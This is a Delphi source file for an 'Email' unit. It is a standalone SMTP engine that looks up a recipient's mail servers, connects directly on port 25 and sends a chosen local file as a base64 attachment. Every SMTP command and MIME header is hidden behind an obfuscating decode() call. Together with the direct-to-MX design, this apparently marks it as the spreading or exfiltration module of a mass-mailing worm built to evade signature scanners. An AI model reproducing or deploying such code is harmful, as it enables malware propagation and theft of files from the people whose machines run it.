// !!ignore!!
{$DEFINE Debug}

UNIT Email;

INTERFACE

USES
  Windows, MXResolver, WinSock, StrList, Unit1;

TYPE
  TSMTPEngine = CLASS(TObject)
  PRIVATE
    Sock    : TSocket;
    FileBuf : AnsiString;
    FUNCTION MySend(STR:STRING) : Boolean;
    FUNCTION MyRecv(Code:STRING) : Boolean;
    FUNCTION NameToIP(HostName:STRING) : STRING;
    FUNCTION ExtractFileName(CONST FileName:ShortString) : ShortString;
  PUBLIC
    Recip, Body, From, Subject, Attachment : AnsiString;
    FUNCTION SendEmail : Boolean;
END;

PROCEDURE Base64Encode(CONST InBuffer;InSize:Cardinal;VAR OutBuffer); OVERLOAD; REGISTER;
PROCEDURE Base64Encode(CONST InText:AnsiString;VAR OutText:AnsiString); OVERLOAD;

IMPLEMENTATION
// !!ignore!!
FUNCTION TSMTPEngine.NameToIP(HostName:STRING) : STRING;
TYPE
  TAPInAddr = ARRAY [0..100] OF PInAddr;
  PAPInAddr =^TAPInAddr;
VAR
  I          : Integer;
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  pptr       : PAPInAddr;
BEGIN
  Result:='';
  WSAStartUp($101,WSAData);
  TRY
    HostEntPtr:=GetHostByName(pChar(HostName));
    IF HostEntPtr<>NIL THEN BEGIN
      pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
      I:=0;
      WHILE pptr^[I]<>NIL DO BEGIN
        Result:=(inet_ntoa(pptr^[I]^));
        Inc(I);
      END;
    END;
  EXCEPT
  END;
  WSACleanUp();
END;

PROCEDURE Base64Encode(CONST InBuffer;InSize:Cardinal;VAR OutBuffer); REGISTER;
// !!ignore!!
CONST
  cBase64Codec : ARRAY [0..63] OF AnsiChar = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
// !!ignore!!
VAR
  ByThrees : Cardinal;
  LeftOver : Cardinal;
  Line     : Word;
ASM
  mov ESI,[EAX]
  mov EDI,[ECX]
  mov EAX,EBX
  mov ECX,$03
  xor EDX,EDX
  div ECX
  mov ByThrees,EAX
  mov LeftOver,EDX
  lea ECX,cBase64Codec[0]
  xor EAX,EAX
  xor EBX,EBX
  xor EDX,EDX
  cmp ByThrees,0
  jz  @@LeftOver
  mov Line,0
  @@LoopStart:
  inc Line
  LODSW
  mov BL,AL
  shr BL,2
  mov DL,BYTE PTR [ECX+EBX]
  mov BH,AH
  and BH,$0F
  rol AX,4
  and AX,$3F
  mov DH,BYTE PTR [ECX+EAX]
  mov AX,DX
  STOSW
  LODSB
  mov BL,AL
  shr BX,6
  mov DL,BYTE PTR [ECX+EBX]
  and AL,$3F
  xor AH,AH
  mov DH,BYTE PTR [ECX+EAX]
  mov AX,DX
  STOSW
  cmp Line,19
  jnz @@ugor
  mov AX,$0A0D
  STOSW
  mov Line,0
  @@ugor:
  dec ByThrees
  jnz @@LoopStart
  @@LeftOver:
  cmp LeftOver, 0
  jz  @@Done
  xor EAX,EAX
  xor EBX,EBX
  xor EDX,EDX
  LODSB
  shl AX,6
  mov BL,AH
  mov DL,BYTE PTR [ECX+EBX]
  dec LeftOver
  jz  @@SaveOne
  shl AX,2
  and AH,$03
  LODSB
  shl AX,4
  mov BL,AH
  mov DH,BYTE PTR [ECX+EBX]
  shl EDX,16
  shr AL,2
  mov BL,AL
  mov DL,BYTE PTR [ECX+EBX]
  mov DH,'='
  jmp @@WriteLast4
  @@SaveOne:
  shr AL,2
  mov BL,AL
  mov DH,BYTE PTR [ECX+EBX]
  shl EDX,16
  mov DH,'='
  mov DL,'='
  @@WriteLast4:
  mov EAX,EDX
  ror EAX,16
  STOSD
  @@Done:
END;

PROCEDURE Base64Encode(CONST InText:AnsiString;VAR OutText:AnsiString); OVERLOAD;
VAR
  PIn     : Pointer;
  POut    : Pointer;
  InSize  : Cardinal;
  OutSize : Cardinal;
BEGIN
  InSize:=Length(InText);
  OutSize:=(InSize DIV 3) SHL 2;
  IF InSize MOD 3>0 THEN Inc(OutSize,4);
  Outsize:=Outsize+Outsize DIV 20;
  SetLength(OutText,OutSize);
  PIn:=@InText[1];
  POut:=@OutText[1];
  Base64Encode(PIn,InSize,POut);
END;

FUNCTION TSMTPEngine.MySend(STR:STRING) : Boolean;
BEGIN
  IF Send(Sock,STR[1],Length(STR),0)=SOCKET_ERROR THEN Result:=True ELSE Result:=False;
END;

FUNCTION TSMTPEngine.ExtractFileName(CONST FileName:ShortString) : ShortString;
VAR
  I : Integer;
BEGIN
  I:=Length(FileName);
  WHILE (I>=1)AND NOT(FileName[I] IN ['\', ':']) DO Dec(I);
  Result:=Copy(FileName,I+1,255);
END;

FUNCTION TSMTPEngine.MyRecv(Code:STRING) : Boolean;
VAR
  Buf : ARRAY [0..2048] OF Char;
BEGIN
  ZeroMemory(@Buf[0],SizeOf(Buf));
  IF(Recv(Sock,Buf,SizeOf(Buf),0)=SOCKET_ERROR)OR(Copy(Buf,1,3)<>Code) THEN Result:=False ELSE Result:=True;
END;

FUNCTION TSMTPEngine.SendEmail : Boolean;
VAR
  I          : Byte;
  F          : FILE;
  WSAData    : TWSAData;
  P          : AnsiString;  
  MXResolver : TMXResolver;
  SockAddrIn : TSockAddrIn;
BEGIN
  Result:=False;
  MXResolver:=TMXResolver.Create(Copy(Recip,Pos('@',Recip)+1,Length(Recip)));
  IF MXResolver.ListOfSMTPServers.Count=0 THEN Exit;
  FOR I:=0 TO MXResolver.ListOfSMTPServers.Count-1 DO BEGIN
    IF MXResolver.ListOfSMTPServers.Strings(I)<>'' THEN BEGIN
      WSAStartUp(257,WSAData);
      Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
      SockAddrIn.sin_family:=AF_INET;
      SockAddrIn.sin_port:=htons(25);
      SockAddrIn.sin_addr.S_addr:=inet_addr(pChar(NameToIP(MXResolver.ListOfSMTPServers.Strings(I))));
      Connect(Sock,SockAddrIn,SizeOf(SockAddrIn));
      IF NOT MyRecv(decode('TTE')) THEN Break;
      MySend(decode('FMb6X7qS.aJs')+#13#10);
      IF NOT MyRecv(decode('TIE')) THEN Break;
      MySend(decode('PfhbXoZ6P:X<')+From+'>'+#13#10);
      IF NOT MyRecv(decode('TIE')) THEN Break;
      MySend(decode('ZwGdXd6:X<')+Recip+'>'+#13#10);
      IF NOT MyRecv(decode('TIE')) THEN Break;
      MySend(decode('|fdf')+#13#10);
      IF NOT MyRecv(decode('vI ')) THEN Break;
      MySend(decode('oBJs:X')+From+#13#10+
             decode('dJ:X')+Recip+#13#10+
             decode('CuyAqaS:X')+Subject+#13#10+
             decode('PhPM-tqBeYJ7:Xg.E')+#13#10+
             decode('wJ7Sq7S-d1lq:XsuQSYlWBS/sYmqO;XyJu7OWB1="yQW"')+#13#10+#13#10+
             decode('--yQW')+#13#10+
             decode('wJ7Sq7S-d1lq:XSqmS/lQWY7;XajWBeqS:ue-WeaYY')+#13#10+#13#10+
             Body+#13#10+#13#10+
             decode('--yQW')+#13#10+
             decode('wJ7Sq7S-d1lq:XWllQYaWSYJ7/m-ejJacKW9q-5QWej;')+#13#10+
             decode('XXXX7Wsq="')+ExtractFileName(Attachment)+'"'+#13#10+
             decode('wJ7Sq7S-dBW7e5qB-M7aJOY7H:XyWeqp ')+#13#10+#13#10);
      AssignFile(F,Attachment);
      FileMode:=0;
      {$I-}
      Reset(F,1);
      IF IOResult=0 THEN BEGIN
        SetLength(FileBuf,FileSize(F));
        BlockRead(F,FileBuf[1],FileSize(F));
        Base64Encode(FileBuf,P);
        MySend(P);
        CloseFile(F);
      END;
      {$I+}
      MySend(#13#10+decode('--yQW--')+#13#10+'.'+#13#10);
      IF NOT MyRecv(decode('TIE')) THEN Break;
      MySend(decode('kRhd')+#13#10);
      Result:=True;
      WSACleanup();
      Exit;
    END;
  END;
END;

END.

